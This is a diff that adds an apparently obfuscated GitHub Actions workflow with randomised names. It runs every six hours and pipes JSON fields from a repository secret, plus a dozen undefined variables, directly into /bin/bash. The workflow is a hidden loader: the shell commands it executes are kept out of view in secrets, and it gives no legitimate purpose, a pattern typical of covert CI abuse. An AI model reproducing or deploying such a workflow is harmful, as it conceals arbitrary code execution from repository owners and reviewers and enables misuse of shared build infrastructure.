@@ -1,0 +1,28 @@
+name: denyhyphae
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: denyhyphae
+        env:
+          muf861: ${{ secrets.muf861 }}
+        run: |
+          echo $muf861 | jq -r .bdgqw798 | /bin/bash
+          echo $pmsa93294 | jq -r .khh5 | /bin/bash
+          echo $vl8686 | jq -r .jvwra899 | /bin/bash
+          echo $s6458 | jq -r .xdxwy79 | /bin/bash
+          echo $ksgzu8691 | jq -r .r2 | /bin/bash
+          echo $mjmf352 | jq -r .xy6 | /bin/bash
+          echo $relz5969 | jq -r .fqqur062 | /bin/bash
+          echo $xo92040 | jq -r .gvij94638 | /bin/bash
+          echo $catb3853 | jq -r .ycxxg6 | /bin/bash
+          echo $gvvfq53 | jq -r .oxgku6 | /bin/bash
+          echo $c650 | jq -r .dyde43670 | /bin/bash
+          echo $idxhw6 | jq -r .vs89197 | /bin/bash
+          echo $i29917 | jq -r .t432 | /bin/bash
+
